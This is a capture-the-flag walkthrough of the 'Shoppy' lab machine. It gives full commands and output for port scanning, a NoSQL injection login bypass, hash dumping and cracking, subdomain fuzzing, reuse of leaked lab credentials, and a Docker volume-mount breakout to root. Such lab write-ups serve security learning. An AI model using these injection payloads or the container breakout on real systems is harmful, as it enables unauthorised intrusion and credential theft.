# SHOPPY WALKTHROUGH

## 1 - Scan ports


command:

```
nmap -sV -sT -sC 10.129.207.108
```
result:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 20:02 -03
Nmap scan report for shoppy.htb (10.129.207.108)
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title:             Shoppy Wait Page        
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2 - Directory enumeration

command:

```
gobuster dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

result:

```
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/20 20:42:13 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]              
/admin                (Status: 302) [Size: 28] [--> /login]   
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/Login                (Status: 200) [Size: 1074]              
/js                   (Status: 301) [Size: 171] [--> /js/]    
/fonts                (Status: 301) [Size: 177] [--> /fonts/] 
/Admin                (Status: 302) [Size: 28] [--> /login]
```


## 2 - Exploit Login page

Nosql injection was used  to this case 

command inside the directory of ffuf after cloned it from github:


```
./ffuf -u http://shoppy.htb/login -c -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'
```

result:

```
:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:' || 'a'=='a            [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 453ms]
```

used the payload in the username field 

 ```
admin' || 'a'=='a
```

 and any value in the password field.

## 3 - Exploit search for users page

http://shoppy.htb/admin/search-users

used the same payload in the field search:

 ```
admin' || 'a'=='a
```

it returnd me a json file to download with the following credentials:

```
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

cracked josh password(md5)(https://crackstation.net/): ```remembermethisway```

## 4 - DNS Enumeration

command:

```
./ffuf -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shoppy.htb"
```

result:

```
alpblog                [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 185ms]
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 185ms]
 www                    [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 199ms]
:: Progress: [2178752/2178752] :: Job [1/1] :: 233 req/sec :: Duration: [2:50:18] :: Errors: 1413 ::
```
 ```
 alpblog.shoppy.htb
mattermost.shoppy.htb
```

## 5 - LOGIN AT mattermost.shoppy.htb

Logged in using the josh credentials in the conversation between 
user in the chat page I found another credentials

```
username: jaeger
password: Sh0ppyBest@pp!
```

## 5 - CONNECT VIA SSH USING jaeger CREDENTIALS

Used jaeger credentials to connect via ssh and get the user flag:

```
jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  Templates  Videos  shoppy_start.sh  user.txt
```

## 6 - FIND password-maneger in deploy FILES

Josh and Jess talked about a password-manager that if we look for permissions using:

```
sudo -l 
```
We will see we can run it as deploy user:

```
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```
This way we will run the following command as deploy user

```
sudo -u deploy /home/deploy/password-manager
```
And this open the password-manager that ask for a password:
```
Welcome to Josh password manager!
Please enter your master password:
```
We don`t have this password, lets see inside source code:
```
cat password-manager
```

We can see this strings:
```
Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
```
Lets use `Sample` as our password.

Again: 

```
sudo -u deploy /home/deploy/password-manager
```
```
Welcome to Josh password manager!
Please enter your master password: Sample
```
And the result is:

```
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```
Lets use the new user:

```
ssh deploy@10.10.11.180
```

7 - DOCKER EXPLOIT

Lets look into the images running in the machine:

command:
```
docker images
```
result:
```
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   2 months ago   5.53MB
```

An alpine image running, lets try use this exploits https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation

command: 
```
docker run -it -v /:/host/ alpine chroot /host/ bash
```
result:
```
$ docker run -it -v /:/host/ alpine chroot /host/ bash
root@135c6d7929a3:/#
```

Ok now we are root!

command:
```
cd root
cat root.txt
```
And we have root key.

